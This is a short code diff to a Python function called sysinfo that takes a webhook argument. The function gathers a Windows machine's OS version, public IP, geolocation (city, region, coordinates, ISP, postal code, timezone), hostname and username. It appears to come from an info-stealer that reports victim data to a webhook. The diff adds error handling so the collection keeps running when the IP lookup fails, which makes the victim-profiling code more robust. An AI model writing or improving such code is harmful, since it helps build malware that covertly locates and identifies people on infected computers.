@@ -21,17 +21,29 @@ from conf import *
 def sysinfo(webhook):
     ver = platform.version().split('.')[2] 
     plat = platform.system() + " " + '10' if int(ver) < 22000 else platform.system() + " " + '11'
-    ip = requests.get('https://ipinfo.io/json')
-    iplog = ip.json()
-    ipadd = iplog.get('ip')
-    city = iplog.get('city')
-    hostname = iplog.get('hostname')
-    region = iplog.get('region')
-    country = iplog.get('country')
-    loc = iplog.get('loc')
-    org = iplog.get('org')
-    postal = iplog.get('postal')
-    timezone = iplog.get('timezone')
+    try:
+        ip = requests.get('https://ipinfo.io/json')
+        iplog = ip.json()
+        ipadd = iplog.get('ip')
+        city = iplog.get('city')
+        hostname = iplog.get('hostname')
+        region = iplog.get('region')
+        country = iplog.get('country')
+        loc = iplog.get('loc')
+        org = iplog.get('org')
+        postal = iplog.get('postal')
+        timezone = iplog.get('timezone')
+    except:
+        ipadd = 'Failed to get IP address'
+        city = 'N/A'
+        hostname = 'Failed to get hostname'
+        region = 'N/A'
+        country = 'N/A'
+        loc = 'N/A'
+        org = 'N/A'
+        postal = 'N/A'
+        timezone = 'N/A'
+
     pcname = socket.gethostname()
     username = os.getenv("USERNAME")
     
